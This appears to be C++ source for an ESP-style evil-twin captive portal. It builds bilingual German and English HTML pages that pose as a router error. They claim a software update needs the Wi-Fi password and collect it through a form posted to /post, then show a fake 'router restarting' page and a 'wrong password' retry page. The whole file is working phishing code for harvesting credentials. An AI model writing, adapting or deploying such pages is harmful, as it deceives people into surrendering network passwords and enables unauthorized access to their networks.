#include "HardwareSerial.h"
#include "sys/_types.h"
#include "portal_pages.h"

String Index(const String& indexLang, const String& favicon, const String& currentSSID, const String& indexCSS){
  String _html; _html.reserve(6500);
  _html += "<!DOCTYPE html><html><head>"
  "<meta charset='UTF-8'>"
  "<title>";

  if (indexLang == "DE"){ _html += "Router-Fehler"; }
  if (indexLang == "EN"){ _html += "Router-ERROR"; }
  
  _html += "</title><link rel='icon' type='image/x-png' href='data:image/png;base64,"
  + favicon +
  "<style>" + indexCSS + "</style>"
  "</head><body><div id='networkBar'>"
  "<span id='networkName'>" + currentSSID + "</span>"
  "</div><div id='pc-center'><div id='content'>";
  
  if (indexLang == "DE"){
    _html += "<div><h1 class='center'>Router-Fehler</h1>"
    "<p>Es wurde ein Problem mit Ihrem Router festgestellt, dass ein Update der Software erfordert.</p>"
    "<p>Dies kann aus verschiedenen Gründen notwendig sein, wie z.B. aufgrund einer Sicherheitslücke oder eines Fehlers in der Software.</p>"
    "<p>Um das Update zu installieren und das Problem zu beheben müssen sie ihr WiFi-Passwort eingeben, dies ist notwendig um zu verifizieren dass sie die erlaubnis haben ein Update zu installieren.</p>"
    "<p>Bitte geben Sie das Wi-Fi-Passwort in das unten stehende Feld ein und klicken Sie auf 'Update Installieren'. Dadurch wird dass Software Update installiert und der Router wird neu gestartet, dadurch sollten die meisten Probleme behoben sein.</p>"
    "<p>Wenn Sie das Wi-Fi-Passwort nicht kennen oder es vergessen haben, kontakieren sie ihren Systemadministrator oder schauen Sie auf dem Etikett and der Rückseite Ihres Routers nach.</p>"
    "<p>Wenn Sie weiterhin Probleme haben, wenden Sie sich an Ihren Systemadministrator oder den Hersteller Ihres Routers.</p>"
    "</div><div><form action='/post'>"
    "<input type='password' placeholder='Wi-Fi-Passwort' name='wifiPassword' minlength='8' required>"
    "<button type='submit' style='margin-left: 15px;'>Update Installieren</button>"
    "</form></div>";
  }

  if (indexLang == "EN"){
    _html += "<div><h1 class='center'>Router-Error</h1>"
    "<p>A problem with your Router has been detected, that requires a software update to be installed.</p>"
    "<p>This may be necessary for various reasons, such as security updates or errors in the Software.</p>"
    "<p>To restart the router and install the update, you will need to enter the Wi-Fi password to ensure that you are authorized to install an update.</p>"
    "<p>Please enter the Wi-Fi password in the field below and click 'Update'. This will install the update and restart the router which should resolve most problems.</p>"
    "<p>If you don't know the Wi-Fi password or have forgotten it, you can contact your systemadministrator or usually you can find it on a label in the back of your router.</p>"
    "<p>If you continue to have problems, contact your Internet service provider or your router manufacturer.</p>"
    "</div><div><form action='/post'>"
    "<input type='password' placeholder='Wi-Fi-Password' name='wifiPassword' minlength='8' required>"
    "<button type='submit' style='margin-left: 15px;'>Update</button>"
    "</form></div>";
  }
    
  _html += "</div></div></body></html>";

  return _html;
}

String Fixing(const String& indexLang, const String& favicon, const String& currentSSID, const String& indexCSS){
  String _html = "<meta charset='UTF-8'><title>";

  if (indexLang == "DE"){_html += "Router wird Neugestartet";}
  if (indexLang == "EN"){_html += "Router is restarting";}
  _html += "</title><link rel='icon' type='image/x-png' href='data:image/png;base64,"
  
  + favicon +
  "<style>" + indexCSS + "</style>"
  "</head><body><div id='networkBar'>"
  "<span id='networkName'>" + currentSSID + "</span>"
  "</div><div id='pc-center'><div id='content'>";
  
  if (indexLang == "DE"){
    _html += "<h1 class='center'>Der Router wird Neugestartet und das Update wird installiert</h1>"
    "<p>Ihr Router wird nun neugestartet und das Update wird installiert, dieser Prozess kann einige Minuten dauern.</p>"
    "<p>Wir danken ihnen für ihre Geduld und hoffen dass die Probleme hierdurch behoben werden.</p>"
    "<p>Falls weiterhin Probleme auftreten sollten sie ihren Systemadministrator oder den Hersteller des Routers kontaktieren.</p>";
  }

  if (indexLang == "EN"){
    _html += "<h1 class='center'>The Router is restarting and the update is beeing installed</h1>"
    "<p>The router will now restart and install the update, this process may take a few minutes.</p>"
    "<p>We thank you for your patience and hope that this will solve your problems.</p>"
    "<p>If the problems are not solved by installing the update please contact your systemadministrator or the manufacturer of the router.</p>";
  }

  _html += "</div></div></body></html>";

  return _html;
}

String wrongPass(const String& indexLang, const String& favicon, const String& currentSSID, const String& indexCSS){
  String _html = "<link rel='icon' type='image/x-png' href='data:image/png;base64,"
  + favicon +
  "<style>" + indexCSS + "</style>"
  "</head><body><div id='networkBar'>"
  "<span id='networkName'>" + currentSSID + "</span>"
  "</div><div id='pc-center'><div id='content'>";
  
  if (indexLang == "DE"){
    _html += "<h1 class='center'>Falsches Passwort!</h1>"
    "<p>Das eingegebene Passwort ist nicht dass richtig Passwort.</p>"
    "<p>Bitte geben sie das richtige Passwort ein um das Update durchzuführen.</p>"
    "<p>Wenn sie das Passwort nicht wissen kontaktieren sie bitte ihren Systemadministrator oder den Hersteller des Routers.</p>"
    "<form action='/'><button type='submit'>Erneut versuchen</button></form>";
  }

  if (indexLang == "EN"){
    _html += "<h1 class='center'>Wrong Password!</h1>"
    "<p>The entered password was not correct.</p>"
    "<p>Please enter the correct password to proceed with the update.</p>"
    "<p>If you don't know the password contact your systemadministrator oder the manufacturer of the router.</p>"
    "<form action='/'><button type='submit'>Try again</button></form>";
  }
    
  _html += "</div></div></body></html>";

  return _html;
}